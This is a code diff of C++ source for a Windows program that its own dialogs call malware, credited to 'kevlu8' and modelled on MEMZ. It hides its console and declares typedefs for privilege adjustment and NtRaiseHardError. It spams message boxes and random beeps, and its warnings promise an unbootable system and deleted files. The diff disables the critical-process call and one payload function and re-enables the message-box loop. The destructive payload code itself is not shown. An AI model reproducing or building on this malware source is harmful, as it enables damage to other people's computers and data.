@@ -14,17 +14,13 @@
 #include <processthreadsapi.h>
 #include <tlhelp32.h>
 #include <utilapiset.h>
-#include "payloads.h"
+//#include "payloads.h"
 
 typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 
 typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
     ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);
 
-typedef long (WINAPI* RtlSetProcessIsCritical) (
-    IN BOOLEAN    bNew,
-    OUT BOOLEAN* pbOld,
-    IN BOOLEAN    bNeedScb);
 
 int audio() {
     while (true) {
@@ -74,18 +70,20 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     ShowWindow(GetConsoleWindow(), SW_HIDE);
  
-    if (MessageBoxW(NULL, L"This program is malware; a program that will render your computer unusable and corrupt your data should you run it. \nIf you understand this and wish to continue, press Yes. If you just found this file accidentally and do not want to harm your computer or your files, press No and this program will not execute.", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES || MessageBoxW(NULL, L"THIS IS YOUR LAST WARNING. THE CREATOR (kevlu8) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO YOUR SYSTEM. BY PRESSING THE \"YES\" BUTTON TO THIS MESSAGE BOX, YOUR SYSTEM WILL BE RENDERED UNBOOTABLE AND YOUR PERSONAL FILES WILL BE DELETED. IF YOU UNDERSTAND THIS AND WISH TO EXECUTE THIS MALICIOUS PROGRAM, CLICK YES. OTHERWISE, THIS IS YOUR LAST CHANCE TO BACK OUT BEFORE YOUR FILES ARE GONE.", L"LAST CHANCE BEFORE GIANT FUCKERY", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
+    if (MessageBoxW(NULL, L"This program is malware; a program that will render your computer unusable should you run it. \nIf you understand this and wish to continue, press Yes. If you just found this file accidentally and do not want to harm your computer or your files, press No and this program will not execute.", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES || MessageBoxW(NULL, L"THIS IS YOUR LAST WARNING. THE CREATOR (kevlu8) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO YOUR SYSTEM. BY PRESSING THE \"YES\" BUTTON TO THIS MESSAGE BOX, YOUR SYSTEM WILL BE RENDERED UNBOOTABLE AND YOUR PERSONAL FILES WILL BE DELETED. IF YOU UNDERSTAND THIS AND WISH TO EXECUTE THIS MALICIOUS PROGRAM, CLICK YES. OTHERWISE, THIS IS YOUR LAST CHANCE TO BACK OUT BEFORE YOUR FILES ARE GONE.", L"LAST CHANCE BEFORE GIANT FUCKERY", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
     {
         ExitProcess(0);
     }
 
-    HANDLE ntdll = LoadLibrary(L"ntdll.dll");
+    //ProtectProcess();
+
+    /*HANDLE ntdll = LoadLibrary(L"ntdll.dll");
     RtlSetProcessIsCritical SetCriticalProcess;
 
     SetCriticalProcess = (RtlSetProcessIsCritical)
         GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
 
-    SetCriticalProcess(TRUE, NULL, FALSE);
+    SetCriticalProcess(TRUE, NULL, FALSE);*/
 
     //ShowWindow(GetConsoleWindow(), SW_HIDE);
 
@@ -140,7 +138,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, 0, &dwID1);
 
     //memz final payload effect but random
-    /*for (int i = 1; i < 50; i++) {
+    for (int i = 1; i < 50; i++) {
 
         //msgbox spam
         DWORD dwID = 0;
@@ -171,9 +169,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
         Beep(rand() % 30000, rand() % 1000);
 
-    }*/
+    }
 
-    p1();
+    //p1();
 
     //i have no idea what this does
     HWND desktop = GetDesktopWindow();
